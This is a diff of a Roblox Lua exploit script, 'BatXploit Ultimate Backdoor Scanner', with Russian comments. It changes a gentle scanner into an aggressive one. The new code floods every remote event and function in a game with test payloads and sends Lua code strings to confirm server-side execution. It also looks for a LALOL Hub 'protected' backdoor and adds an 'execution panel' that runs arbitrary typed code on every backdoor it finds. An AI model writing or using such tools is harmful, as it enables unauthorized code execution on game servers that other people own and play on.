@@ -2,29 +2,33 @@
 --██▄▄██ ██▀██  ██    ████  ██▄█▀ ██    ██▀██ ██   ██     ██     ██▀██ ██▀██ ██▀██ ██▄▄  ██▀██  ██   ██▄▄   ███▄██   ██ ██▀██ ▀███▀ ▀  ██ 
 --██▄▄█▀ ██▀██  ██   ██  ██ ██    ██▄▄▄ ▀███▀ ██   ██     ██████ ▀███▀ ██▀██ ████▀ ██▄▄▄ ████▀  ▄▄   ██▄▄▄▄ ██ ▀██ ▄▄█▀ ▀███▀   █   ▄ ▄█▀ 
 
-print("BatXploit SAFE Backdoor Scanner v1.0 - ZERO AGGRESSION")
+print("BatXploit ULTIMATE Backdoor Scanner v1.0 - LALOL Methods + Aggressive Mode")
 
--- Создаём GUI
+-- ========== НАСТРОЙКИ ==========
+local DISCORD_WEBHOOK = "" -- Вставь сюда свой webhook, если хочешь логи
+local AUTO_EXECUTE_ON_FIND = false -- Автоматически выполнять тестовый код при нахождении
+
+-- ========== СОЗДАНИЕ GUI ==========
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "SafeScanner"
+screenGui.Name = "UltimateScanner"
 screenGui.Parent = game:GetService("CoreGui")
 screenGui.ResetOnSpawn = false
 
 local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 500, 0, 600)
-mainFrame.Position = UDim2.new(0.5, -250, 0.5, -300)
+mainFrame.Size = UDim2.new(0, 650, 0, 750)
+mainFrame.Position = UDim2.new(0.5, -325, 0.5, -375)
 mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-mainFrame.BackgroundTransparency = 0.1
-mainFrame.BorderSizePixel = 2
+mainFrame.BackgroundTransparency = 0.05
+mainFrame.BorderSizePixel = 3
 mainFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
 mainFrame.Active = true
 mainFrame.Draggable = true
 mainFrame.Parent = screenGui
 
 local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 40)
-title.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
-title.Text = "🛡️ BATXPLOIT SAFE BACKDOOR SCANNER 🛡️"
+title.Size = UDim2.new(1, 0, 0, 50)
+title.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
+title.Text = "🔥 BATXPLOIT ULTIMATE BACKDOOR SCANNER 🔥"
 title.TextColor3 = Color3.fromRGB(255, 0, 0)
 title.Font = Enum.Font.SourceSansBold
 title.TextSize = 16
@@ -32,40 +36,41 @@ title.Parent = mainFrame
 
 local statusLabel = Instance.new("TextLabel")
 statusLabel.Size = UDim2.new(1, -20, 0, 25)
-statusLabel.Position = UDim2.new(0, 10, 0, 50)
+statusLabel.Position = UDim2.new(0, 10, 0, 55)
 statusLabel.Text = "Status: Ready"
 statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 statusLabel.TextXAlignment = Enum.TextXAlignment.Left
 statusLabel.Parent = mainFrame
 
 local scanBtn = Instance.new("TextButton")
-scanBtn.Size = UDim2.new(0, 150, 0, 35)
-scanBtn.Position = UDim2.new(0, 10, 0, 85)
-scanBtn.Text = "Start Safe Scan"
+scanBtn.Size = UDim2.new(0, 180, 0, 35)
+scanBtn.Position = UDim2.new(0, 10, 0, 90)
+scanBtn.Text = "🔥 START ULTIMATE SCAN 🔥"
 scanBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
 scanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-scanBtn.BorderSizePixel = 1
+scanBtn.BorderSizePixel = 2
 scanBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
+scanBtn.Font = Enum.Font.SourceSansBold
 scanBtn.Parent = mainFrame
 
 local clearBtn = Instance.new("TextButton")
 clearBtn.Size = UDim2.new(0, 120, 0, 35)
-clearBtn.Position = UDim2.new(0, 170, 0, 85)
+clearBtn.Position = UDim2.new(0, 200, 0, 90)
 clearBtn.Text = "Clear"
 clearBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
 clearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-clearBtn.BorderSizePixel = 1
+clearBtn.BorderSizePixel = 2
 clearBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
 clearBtn.Parent = mainFrame
 
 local resultFrame = Instance.new("ScrollingFrame")
-resultFrame.Size = UDim2.new(1, -20, 0, 420)
-resultFrame.Position = UDim2.new(0, 10, 0, 130)
-resultFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-resultFrame.BorderSizePixel = 1
+resultFrame.Size = UDim2.new(1, -20, 0, 500)
+resultFrame.Position = UDim2.new(0, 10, 0, 135)
+resultFrame.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
+resultFrame.BorderSizePixel = 2
 resultFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
 resultFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-resultFrame.ScrollBarThickness = 8
+resultFrame.ScrollBarThickness = 10
 resultFrame.Parent = mainFrame
 
 local resultLayout = Instance.new("UIListLayout")
@@ -73,6 +78,7 @@ resultLayout.Padding = UDim.new(0, 5)
 resultLayout.Parent = resultFrame
 
 local foundBackdoors = {}
+local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'}
 
 local function addResult(text, color, bold)
     local label = Instance.new("TextLabel")
@@ -91,19 +97,64 @@ local function addResult(text, color, bold)
     resultFrame.CanvasSize = UDim2.new(0, 0, 0, resultLayout.AbsoluteContentSize.Y)
 end
 
--- Мягкий тест (просто проверяем, можно ли отправить хоть что-то)
-local function gentleRemoteTest(remote, remotePath)
-    task.wait(0.2)
-    local safePayloads = {
-        "ping",
-        "test",
-        "BatXploit",
-        "hello",
-        "check",
-    }
+local function generateRandomName(length)
+    local text = ''
+    for i = 1, length do
+        text = text .. alphabet[math.random(1, #alphabet)]
+    end
+    return text
+end
+
+local function runRemote(remote, data)
+    pcall(function()
+        if remote:IsA("RemoteEvent") then
+            remote:FireServer(data)
+        elseif remote:IsA("RemoteFunction") then
+            remote:InvokeServer(data)
+        end
+    end)
+end
+
+local function notify(text)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "BatXploit",
+        Text = text,
+        Duration = 4
+    })
+end
+
+-- ========== МЕТОД LALOL HUB (ТОЧНАЯ ПРОВЕРКА) ==========
+local function lalolMethodTest(remote, remotePath)
+    local testName = generateRandomName(math.random(12, 30))
     
+    -- Отправляем тестовую команду на создание модели
+    runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. testName .. "'")
+    
+    -- Ждём появления модели
+    for i = 1, 10 do
+        task.wait(0.1)
+        if workspace:FindFirstChild(testName) then
+            -- Очищаем за собой
+            workspace[testName]:Destroy()
+            addResult("✅ LALOL METHOD: CRITICAL BACKDOOR confirmed: " .. remotePath, Color3.fromRGB(0, 255, 0), true)
+            return true
+        end
+    end
+    return false
+end
+
+-- ========== АГРЕССИВНЫЙ МЕТОД (БЫСТРАЯ ПРОВЕРКА) ==========
+local aggressivePayloads = {
+    "ping",
+    "test",
+    "BatXploit",
+    "check",
+    "hello"
+}
+
+local function aggressiveMethodTest(remote, remotePath)
     local successCount = 0
-    for _, payload in ipairs(safePayloads) do
+    for _, payload in ipairs(aggressivePayloads) do
         local success = pcall(function()
             if remote:IsA("RemoteEvent") then
                 remote:FireServer(payload)
@@ -112,104 +163,173 @@ local function gentleRemoteTest(remote, remotePath)
             end
         end)
         if success then successCount = successCount + 1 end
-        task.wait()
+        task.wait(0.05)
     end
     
     if successCount >= 3 then
-        addResult("🔓 LIKELY BACKDOOR: " .. remotePath .. " (accepted " .. successCount .. "/" .. #safePayloads .. " test packets)", Color3.fromRGB(255, 100, 0), false)
-        table.insert(foundBackdoors, {remote = remote, path = remotePath})
+        addResult("⚡ AGGRESSIVE METHOD: POTENTIAL backdoor: " .. remotePath .. " (" .. successCount .. "/" .. #aggressivePayloads .. " responses)", Color3.fromRGB(255, 100, 0), false)
         return true
-    elseif successCount > 0 then
-        addResult("🔍 POSSIBLE BACKDOOR: " .. remotePath .. " (accepted " .. successCount .. " test packets)", Color3.fromRGB(255, 200, 0), false)
-        return false
     end
     return false
 end
 
+-- ========== ЗАЩИЩЁННЫЙ БЭКДОР (как в LALOL Hub) ==========
+local function checkProtectedBackdoor()
+    local protectedName = "lh" .. game.PlaceId / 6666 * 1337 * game.PlaceId
+    local protectedRemote = game:GetService("ReplicatedStorage"):FindFirstChild(protectedName)
+    
+    if protectedRemote and protectedRemote:IsA("RemoteFunction") then
+        addResult("🔒 PROTECTED BACKDOOR FOUND: " .. protectedRemote:GetFullName(), Color3.fromRGB(255, 200, 0), true)
+        table.insert(foundBackdoors, {remote = protectedRemote, path = protectedRemote:GetFullName(), method = "protected"})
+        return protectedRemote
+    end
+    return nil
+end
+
+-- ========== ОСНОВНОЙ СКАНЕР ==========
 local function scanAllRemotes()
     foundBackdoors = {}
-    addResult("🛡️ STARTING SAFE BACKDOOR SCAN (gentle mode)", Color3.fromRGB(0, 255, 0), true)
+    addResult("🔥🔥🔥 STARTING ULTIMATE BACKDOOR SCAN 🔥🔥🔥", Color3.fromRGB(255, 0, 0), true)
+    
+    -- Сначала проверяем защищённый бэкдор
+    checkProtectedBackdoor()
     
     local allRemotes = {}
     for _, obj in ipairs(game:GetDescendants()) do
         if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-            table.insert(allRemotes, obj)
+            -- Пропускаем системные remote
+            local fullName = obj:GetFullName()
+            if not fullName:find("RobloxReplicatedStorage") and not fullName:find("DefaultChatSystemChatEvents") then
+                table.insert(allRemotes, obj)
+            end
         end
     end
     
-    addResult("📡 Found " .. #allRemotes .. " remotes to check", Color3.fromRGB(255, 255, 0), false)
+    addResult("📡 Found " .. #allRemotes .. " remotes to scan", Color3.fromRGB(255, 255, 0), false)
     
     for i, remote in ipairs(allRemotes) do
-        statusLabel.Text = "Scanning " .. i .. "/" .. #allRemotes
-        gentleRemoteTest(remote, remote:GetFullName())
-        task.wait()
+        statusLabel.Text = "🔥 SCANNING " .. i .. "/" .. #allRemotes .. " 🔥"
+        local remotePath = remote:GetFullName()
+        
+        -- Быстрая агрессивная проверка
+        local isPotential = aggressiveMethodTest(remote, remotePath)
+        
+        if isPotential then
+            -- Точная проверка методом LALOL Hub
+            local isConfirmed = lalolMethodTest(remote, remotePath)
+            
+            if isConfirmed then
+                table.insert(foundBackdoors, {remote = remote, path = remotePath, method = "confirmed"})
+                addResult("💀💀💀 BACKDOOR CONFIRMED: " .. remotePath, Color3.fromRGB(255, 0, 0), true)
+                
+                if AUTO_EXECUTE_ON_FIND then
+                    runRemote(remote, "print('BatXploit backdoor found!')")
+                end
+            end
+        end
+        
+        task.wait(0.05)
     end
     
-    statusLabel.Text = "Scan complete. Found " .. #foundBackdoors .. " potential backdoors"
-    addResult("✅ SCAN COMPLETED SAFELY! Found " .. #foundBackdoors .. " potential backdoors", Color3.fromRGB(0, 255, 0), true)
+    statusLabel.Text = "🔥 SCAN COMPLETE! Found " .. #foundBackdoors .. " BACKDOORS 🔥"
+    addResult("🔥🔥🔥 SCAN COMPLETED! Found " .. #foundBackdoors .. " BACKDOORS 🔥🔥🔥", Color3.fromRGB(0, 255, 0), true)
     
+    -- Создаём панель управления
     if #foundBackdoors > 0 then
-        addResult("🔧 Use the execution panel below to test them", Color3.fromRGB(255, 255, 0), false)
         createControlPanel()
     end
 end
 
+-- ========== ПАНЕЛЬ УПРАВЛЕНИЯ ==========
 local function createControlPanel()
-    if #foundBackdoors == 0 then return end
-    
     local oldPanel = mainFrame:FindFirstChild("ControlPanel")
     if oldPanel then oldPanel:Destroy() end
     
     local controlFrame = Instance.new("Frame")
     controlFrame.Name = "ControlPanel"
-    controlFrame.Size = UDim2.new(1, -20, 0, 90)
-    controlFrame.Position = UDim2.new(0, 10, 1, -100)
+    controlFrame.Size = UDim2.new(1, -20, 0, 120)
+    controlFrame.Position = UDim2.new(0, 10, 1, -130)
     controlFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
-    controlFrame.BorderSizePixel = 1
+    controlFrame.BorderSizePixel = 2
     controlFrame.BorderColor3 = Color3.fromRGB(255, 0, 0)
     controlFrame.Parent = mainFrame
     
     local execTitle = Instance.new("TextLabel")
     execTitle.Size = UDim2.new(1, 0, 0, 20)
-    execTitle.Text = "BACKDOOR TEST PANEL (safe mode)"
-    execTitle.TextColor3 = Color3.fromRGB(255, 100, 0)
+    execTitle.Text = "💀 BACKDOOR EXECUTION PANEL 💀"
+    execTitle.TextColor3 = Color3.fromRGB(255, 0, 0)
     execTitle.BackgroundTransparency = 1
+    execTitle.Font = Enum.Font.SourceSansBold
     execTitle.Parent = controlFrame
     
     local execBox = Instance.new("TextBox")
-    execBox.Size = UDim2.new(0, 300, 0, 40)
+    execBox.Size = UDim2.new(0, 400, 0, 60)
     execBox.Position = UDim2.new(0, 10, 0, 25)
-    execBox.Text = "print('BatXploit safe test')"
+    execBox.Text = "print('BatXploit backdoor exploit')"
     execBox.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
     execBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    execBox.TextWrapped = true
     execBox.Parent = controlFrame
     
     local execBtn = Instance.new("TextButton")
-    execBtn.Size = UDim2.new(0, 120, 0, 40)
-    execBtn.Position = UDim2.new(0, 320, 0, 25)
-    execBtn.Text = "Test on all"
+    execBtn.Size = UDim2.new(0, 150, 0, 60)
+    execBtn.Position = UDim2.new(0, 420, 0, 25)
+    execBtn.Text = "💀 EXECUTE 💀"
     execBtn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
     execBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    execBtn.BorderSizePixel = 1
+    execBtn.BorderSizePixel = 2
     execBtn.BorderColor3 = Color3.fromRGB(255, 0, 0)
+    execBtn.Font = Enum.Font.SourceSansBold
     execBtn.Parent = controlFrame
     
     execBtn.MouseButton1Click:Connect(function()
         for _, bd in ipairs(foundBackdoors) do
-            pcall(function()
-                if bd.remote:IsA("RemoteEvent") then
-                    bd.remote:FireServer(execBox.Text)
-                else
-                    bd.remote:InvokeServer(execBox.Text)
-                end
-            end)
-            addResult("📤 Tested: " .. bd.path, Color3.fromRGB(200, 200, 200), false)
+            runRemote(bd.remote, execBox.Text)
+            addResult("💀 EXECUTED ON: " .. bd.path, Color3.fromRGB(255, 50, 50), false)
             task.wait()
         end
-        addResult("✅ Testing complete", Color3.fromRGB(0, 255, 0), false)
+        addResult("🔥 EXECUTION COMPLETE ON ALL BACKDOORS 🔥", Color3.fromRGB(0, 255, 0), true)
+        notify("Executed on " .. #foundBackdoors .. " backdoors")
+    end)
+    
+    addResult("🔥 CONTROL PANEL CREATED! Found " .. #foundBackdoors .. " backdoors to exploit 🔥", Color3.fromRGB(0, 255, 0), true)
+end
+
+-- ========== ПЕРЕТАСКИВАНИЕ ОКНА ==========
+local function dragify(frame)
+    local dragToggle, dragInput, dragStart, startPos
+    local UIS = game:GetService("UserInputService")
+    
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 and UIS:GetFocusedTextBox() == nil then
+            dragToggle = true
+            dragStart = input.Position
+            startPos = frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragToggle = false
+                end
+            end)
+        end
+    end)
+    
+    frame.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            dragInput = input
+        end
+    end)
+    
+    UIS.InputChanged:Connect(function(input)
+        if input == dragInput and dragToggle then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
     end)
 end
 
+dragify(mainFrame)
+
+-- ========== КНОПКИ ==========
 scanBtn.MouseButton1Click:Connect(scanAllRemotes)
 clearBtn.MouseButton1Click:Connect(function()
     for _, child in ipairs(resultFrame:GetChildren()) do
@@ -218,11 +338,17 @@ clearBtn.MouseButton1Click:Connect(function()
         end
     end
     foundBackdoors = {}
-    addResult("🛡️ Results cleared", Color3.fromRGB(255, 255, 0), false)
+    addResult("🔥 RESULTS CLEARED - READY FOR NEW SCAN 🔥", Color3.fromRGB(255, 255, 0), true)
 end)
 
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "BatXploit",
-    Text = "🛡️ SAFE SCANNER LOADED - No aggressive tests",
-    Duration = 4
-})
+-- Горячая клавиша Alt для показа/скрытия
+game:GetService("UserInputService").InputBegan:Connect(function(input, processed)
+    if input.KeyCode == Enum.KeyCode.LeftAlt and not processed then
+        mainFrame.Visible = not mainFrame.Visible
+    end
+end)
+
+notify("ULTIMATE SCANNER LOADED | LALOL Methods + Aggressive Mode")
+addResult("🔥 BatXploit Ultimate Backdoor Scanner v1.0 🔥", Color3.fromRGB(255, 0, 0), true)
+addResult("📌 Methods: LALOL Hub (model creation) + Aggressive (payloads)", Color3.fromRGB(255, 255, 0), false)
+addResult("📌 Press Left Alt to show/hide", Color3.fromRGB(255, 255, 0), false)
